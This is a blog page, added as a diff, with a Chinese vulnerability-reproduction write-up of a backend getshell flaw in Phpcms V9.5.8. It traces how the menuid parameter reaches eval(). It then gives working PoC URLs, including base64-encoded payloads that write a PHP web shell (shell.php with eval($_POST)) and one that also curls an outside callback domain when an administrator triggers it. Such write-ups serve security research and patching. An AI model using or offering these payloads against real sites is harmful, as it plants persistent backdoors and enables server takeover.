@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Phpcms V9.5.8 后台getshell一、漏洞简介二、漏洞影响Phpcms V9.5.8 三、复现过程漏洞分析代码位于&#x2F;phpcms&#x2F;modules&#x2F;content&#x2F;content.php 第472-532行 public function public_categorys() &amp;#123;     $show_header &#x3D; &#39;&#39;;     $cfg &#x3D; getcac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.5.8%20%E5%90%8E%E5%8F%B0getshell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Phpcms V9.5.8 后台getshell一、漏洞简介二、漏洞影响Phpcms V9.5.8 三、复现过程漏洞分析代码位于&#x2F;phpcms&#x2F;modules&#x2F;content&#x2F;content.php 第472-532行 public function public_categorys() &amp;#123;     $show_header &#x3D; &#39;&#39;;     $cfg &#x3D; getcac">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId27.png">
+<meta property="article:published_time" content="2022-07-08T06:26:01.711Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Phpcms/Phpcms V9.5.8 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.5.8%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.711Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-V9-5-8-后台getshell"><a href="#Phpcms-V9-5-8-后台getshell" class="headerlink" title="Phpcms V9.5.8 后台getshell"></a>Phpcms V9.5.8 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.5.8</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码位于<code>/phpcms/modules/content/content.php</code> 第472-532行</p>
+<pre><code>public function public_categorys() &#123;
+    $show_header = &#39;&#39;;
+    $cfg = getcache(&#39;common&#39;,&#39;commons&#39;);
+    $ajax_show = intval($cfg[&#39;category_ajax&#39;]);
+    $from = isset($_GET[&#39;from&#39;]) &amp;&amp; in_array($_GET[&#39;from&#39;],array(&#39;block&#39;)) ? $_GET[&#39;from&#39;] : &#39;content&#39;;
+    $tree = pc_base::load_sys_class(&#39;tree&#39;);
+    if($from==&#39;content&#39; &amp;&amp; $_SESSION[&#39;roleid&#39;] != 1) &#123; 
+        $this-&gt;priv_db = pc_base::load_model(&#39;category_priv_model&#39;);
+        $priv_result = $this-&gt;priv_db-&gt;select(array(&#39;action&#39;=&gt;&#39;init&#39;,&#39;roleid&#39;=&gt;$_SESSION[&#39;roleid&#39;],&#39;siteid&#39;=&gt;$this-&gt;siteid,&#39;is_admin&#39;=&gt;1));
+        $priv_catids = array();
+        foreach($priv_result as $_v) &#123;
+            $priv_catids[] = $_v[&#39;catid&#39;];
+        &#125;
+        if(empty($priv_catids)) return &#39;&#39;;
+    &#125;
+    $categorys = array();
+    if(!empty($this-&gt;categorys)) &#123;
+        foreach($this-&gt;categorys as $r) &#123;
+            if($r[&#39;siteid&#39;]!=$this-&gt;siteid ||  ($r[&#39;type&#39;]==2 &amp;&amp; $r[&#39;child&#39;]==0)) continue;
+            if($from==&#39;content&#39; &amp;&amp; $_SESSION[&#39;roleid&#39;] != 1 &amp;&amp; !in_array($r[&#39;catid&#39;],$priv_catids)) &#123;
+                $arrchildid = explode(&#39;,&#39;,$r[&#39;arrchildid&#39;]);
+                $array_intersect = array_intersect($priv_catids,$arrchildid);
+                if(empty($array_intersect)) continue;
+            &#125;
+            if($r[&#39;type&#39;]==1 || $from==&#39;block&#39;) &#123;
+                if($r[&#39;type&#39;]==0) &#123;
+                    $r[&#39;vs_show&#39;] = &quot;&lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&amp;type=show&#39; target=&#39;right&#39;&gt;[&quot;.L(&#39;content_page&#39;).&quot;]&lt;/a&gt;&quot;;
+                &#125; else &#123;
+                    $r[&#39;vs_show&#39;] =&#39;&#39;;
+                &#125;
+                $r[&#39;icon_type&#39;] = &#39;file&#39;;
+                $r[&#39;add_icon&#39;] = &#39;&#39;;
+                $r[&#39;type&#39;] = &#39;add&#39;;
+            &#125; else &#123;
+                $r[&#39;icon_type&#39;] = $r[&#39;vs_show&#39;] = &#39;&#39;;
+                $r[&#39;type&#39;] = &#39;init&#39;;
+                $r[&#39;add_icon&#39;] = &quot;&lt;a target=&#39;right&#39; href=&#39;?m=content&amp;c=content&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&#39; onclick=javascript:openwinx(&#39;?m=content&amp;c=content&amp;a=add&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&amp;hash_page=&quot;.$_SESSION[&#39;hash_page&#39;].&quot;&#39;,&#39;&#39;)&gt;&lt;img src=&#39;&quot;.IMG_PATH.&quot;add_content.gif&#39; alt=&#39;&quot;.L(&#39;add&#39;).&quot;&#39;&gt;&lt;/a&gt; &quot;;
+            &#125;
+            $categorys[$r[&#39;catid&#39;]] = $r;
+        &#125;
+    &#125;
+    if(!empty($categorys)) &#123;
+        $tree-&gt;init($categorys);
+            switch($from) &#123;
+                case &#39;block&#39;:
+                    $strs = &quot;&lt;span class=&#39;\$icon_type&#39;&gt;\$add_icon&lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&amp;type=list&#39; target=&#39;right&#39;&gt;\$catname&lt;/a&gt; \$vs_show&lt;/span&gt;&quot;;
+                    $strs2 = &quot;&lt;img src=&#39;&quot;.IMG_PATH.&quot;folder.gif&#39;&gt; &lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&amp;type=category&#39; target=&#39;right&#39;&gt;\$catname&lt;/a&gt;&quot;;
+                break;
+ 
+                default:
+                    $strs = &quot;&lt;span class=&#39;\$icon_type&#39;&gt;\$add_icon&lt;a href=&#39;?m=content&amp;c=content&amp;a=\$type&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&#39; target=&#39;right&#39; onclick=&#39;open_list(this)&#39;&gt;\$catname&lt;/a&gt;&lt;/span&gt;&quot;;
+                    $strs2 = &quot;&lt;span class=&#39;folder&#39;&gt;\$catname&lt;/span&gt;&quot;;
+                    break;
+            &#125;
+        $categorys = $tree-&gt;get_treeview(0,&#39;category_tree&#39;,$strs,$strs2,$ajax_show);
+    &#125; else &#123;
+        $categorys = L(&#39;please_add_category&#39;);
+    &#125;
+    include $this-&gt;admin_tpl(&#39;category_tree&#39;);
+    exit;
+&#125;
+</code></pre>
+<p>复制 文本</p>
+<p>在当前函数开始下个断点</p>
+<p><img src="/resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId25.png" alt="1.png"><img src="/resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId26.png" alt="2.png"></p>
+<p>跟到526行：</p>
+<pre><code>$categorys = $tree-&gt;get_treeview(0,&#39;category_tree&#39;,$strs,$strs2,$ajax_show);
+</code></pre>
+<p>复制 文本</p>
+<p>进入了<code>get_treeview()</code>函数，跟入进去，</p>
+<p>函数位于 <code>/phpcms/libs/classes/tree.class.php</code> 第206-239行。</p>
+<pre><code>* @param $myid 表示获得这个ID下的所有子级
+* @param $effected_id 需要生成treeview目录数的id
+* @param $str 末级样式
+* @param $str2 目录级别样式
+* @param $showlevel 直接显示层级数，其余为异步显示，0为全部限制
+* @param $style 目录样式 默认 filetree 可增加其他样式如&#39;filetree treeview-famfamfam&#39;
+* @param $currentlevel 计算当前层级，递归使用 适用改函数时不需要用该参数
+* @param $recursion 递归使用 外部调用时为FALSE
+function get_treeview($myid,$effected_id=&#39;example&#39;,$str=&quot;&lt;span class=&#39;file&#39;&gt;\$name&lt;/span&gt;&quot;, $str2=&quot;&lt;span class=&#39;folder&#39;&gt;\$name&lt;/span&gt;&quot; ,$showlevel = 0 ,$style=&#39;filetree &#39; , $currentlevel = 1,$recursion=FALSE) &#123;
+     $child = $this-&gt;get_child($myid);
+     if(!defined(&#39;EFFECTED_INIT&#39;))&#123;
+        $effected = &#39; id=&quot;&#39;.$effected_id.&#39;&quot;&#39;;
+        define(&#39;EFFECTED_INIT&#39;, 1);
+     &#125; else &#123;
+        $effected = &#39;&#39;;
+     &#125;
+     $placeholder =  &#39;&lt;ul&gt;&lt;li&gt;&lt;span class=&quot;placeholder&quot;&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&#39;;
+     if(!$recursion) $this-&gt;str .=&#39;&lt;ul&#39;.$effected.&#39;  class=&quot;&#39;.$style.&#39;&quot;&gt;&#39;;
+     foreach($child as $id=&gt;$a) &#123;
+ 
+         @extract($a);
+         if($showlevel &gt; 0 &amp;&amp; $showlevel == $currentlevel &amp;&amp; $this-&gt;get_child($id)) $folder = &#39;hasChildren&#39;; //如设置显示层级模式@2011.07.01
+         $floder_status = isset($folder) ? &#39; class=&quot;&#39;.$folder.&#39;&quot;&#39; : &#39;&#39;;     
+         $this-&gt;str .= $recursion ? &#39;&lt;ul&gt;&lt;li&#39;.$floder_status.&#39; id=\&#39;&#39;.$id.&#39;\&#39;&gt;&#39; : &#39;&lt;li&#39;.$floder_status.&#39; id=\&#39;&#39;.$id.&#39;\&#39;&gt;&#39;;
+         $recursion = FALSE;
+         if($this-&gt;get_child($id))&#123;
+             eval(&quot;\$nstr = \&quot;$str2\&quot;;&quot;);
+             $this-&gt;str .= $nstr;
+             if($showlevel == 0 || ($showlevel &gt; 0 &amp;&amp; $showlevel &gt; $currentlevel)) &#123;
+                 $this-&gt;get_treeview($id, $effected_id, $str, $str2, $showlevel, $style, $currentlevel+1, TRUE);
+             &#125; elseif($showlevel &gt; 0 &amp;&amp; $showlevel == $currentlevel) &#123;
+                 $this-&gt;str .= $placeholder;
+             &#125;
+         &#125; else &#123;
+             eval(&quot;\$nstr = \&quot;$str\&quot;;&quot;);
+             $this-&gt;str .= $nstr;
+         &#125;
+         $this-&gt;str .=$recursion ? &#39;&lt;/li&gt;&lt;/ul&gt;&#39;: &#39;&lt;/li&gt;&#39;;
+     &#125;
+     if(!$recursion)  $this-&gt;str .=&#39;&lt;/ul&gt;&#39;;
+     return $this-&gt;str;
+ &#125;
+</code></pre>
+<p>复制 文本</p>
+<p>这里有个判断：</p>
+<pre><code>if($this-&gt;get_child($id))
+</code></pre>
+<p><img src="/resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId27.png" alt="3.png"></p>
+<p>当第一次执行为ture的时候，还是会再次执行<code>get_treeview</code>的内容</p>
+<pre><code>$this-&gt;get_treeview($id, $effected_id, $str, $str2, $showlevel, $style, $currentlevel+1, TRUE);
+</code></pre>
+<p>第二次执行的时候<code>$myid</code>由0变成了1，</p>
+<p>这时候的<code>$newarr</code>为空，</p>
+<p>if就不执行，转而执行elseif和else，而<code>$str</code>包含着<code>menuid</code>的值，也就是<code>$&#123;@phpinfo()&#125;</code><br>，这时候<code>eval()</code> 就执行了php代码。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>常规poc：</strong><code>https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=$&#123;@phpinfo()&#125;</code></p>
+<p><strong>进阶版poc：</strong><code>https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=$&#123;@(assert(base64_decode(ZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycpOw)))&#125;</code></p>
+<blockquote>
+<p>密码1，这要管理员权限才能代码执行，修改下payload，管理员一访问就在当前域名的首页路径下生成shell。</p>
+</blockquote>
+<p><code>print_r(base64_encode(&quot;fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval(\$_POST[2]);&#39;);system(&#39;curl &#39;.\$_SERVER[\&quot;SERVER_NAME\&quot;].&#39;www.0-sec.org&#39;);&quot;));</code></p>
+<blockquote>
+<p>还有另一种payload，会回显的提醒。自动curl请求你的域名，然后回显网站url</p>
+<p>先输出base64的地址，然后在替换下面的字符串&gt; <code>https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=($&#123;@(assert(eval(base64_decode(ZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbMl0pOycpO3N5c3RlbSgnY3VybCAnLiRfU0VSVkVSWyJTRVJWRVJfTkFNRSJdLic0MzIxLm5yY3VmOS5jZXllLmlvJyk7))))&#125;)</code></p>
+</blockquote>
+<p>这个字符串有几个点提醒下自己，<code> assert()</code>函数执行执行一句php代码，所以在assert前面加个eval，执行多条语句。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.mrwu.red/web/2723.html">https://www.mrwu.red/web/2723.html</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.5.8%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qu5m00dvy8v187ecfkvk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.0%20authkey%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
